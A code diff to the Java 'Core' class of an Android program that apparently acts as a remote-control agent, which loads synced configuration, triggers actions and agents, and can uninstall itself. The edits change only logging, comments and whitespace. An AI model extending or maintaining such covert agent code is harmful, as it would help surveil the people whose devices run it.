@@ -145,6 +145,12 @@ public class Core extends Activity implements Runnable {
 
 		try {
 			while (!bStopCore) {
+				// XXX DEBUG REMOVE
+				//if (0 != 1) {
+				//	Utils.sleep(SLEEPING_TIME);
+				//	continue;
+				//}
+				
 				Log.d(TAG,"checkActions");
 				final int[] actionIds = status.getTriggeredActions();
 
@@ -160,9 +166,11 @@ public class Core extends Activity implements Runnable {
 						if (exitValue == Exit.UNINSTALL) {
 							Log.d(TAG,"Info: checkActions: Uninstall");
 							UninstallAction.actualExecute();
+							
 							return exitValue;
 						} else if (exitValue == Exit.RELOAD) {
 							Log.d(TAG,"checkActions: want Reload");
+							
 							return exitValue;
 						}
 					}
@@ -173,9 +181,10 @@ public class Core extends Activity implements Runnable {
 			
 			return Exit.STOP;
 		} catch (final Throwable ex) {
-			// catching trowable should break the debugger anc log the full
+			// catching trowable should break the debugger ans log the full
 			// stack trace
-			Log.d(TAG,"FATAL: checkActions error, restart: " + ex);
+			Log.d("QZ", TAG + " FATAL: checkActions error, restart: " + ex);
+			
 			return Exit.ERROR;
 		}
 		
@@ -243,7 +252,6 @@ public class Core extends Activity implements Runnable {
 	 *             the rCS exception
 	 */
 	public boolean loadConf() throws RCSException {
-
 		boolean loaded = false;
 
 		// tries to load the file got from the sync, if any.
@@ -299,6 +307,7 @@ public class Core extends Activity implements Runnable {
 	 */
 	private Exit executeAction(final Action action) {
 		Exit exit = Exit.SUCCESS;
+		
 		Log.d(TAG,"CheckActions() triggered: " + action);
 		final Status status = Status.self();
 		status.unTriggerAction(action);
@@ -357,10 +366,13 @@ public class Core extends Activity implements Runnable {
 					status.setRestarting(true);
 					Log.d(TAG,"Warn: " +"checkActions: reloading");
 					status.unTriggerAll();
+					
 					Log.d(TAG,"checkActions: stopping agents");
 					agentManager.stopAll();
+					
 					Log.d(TAG,"checkActions: stopping events");
 					eventManager.stopAll();
+					
 					Utils.sleep(2000);
 					Log.d(TAG,"checkActions: untrigger all");
 					status.unTriggerAll();
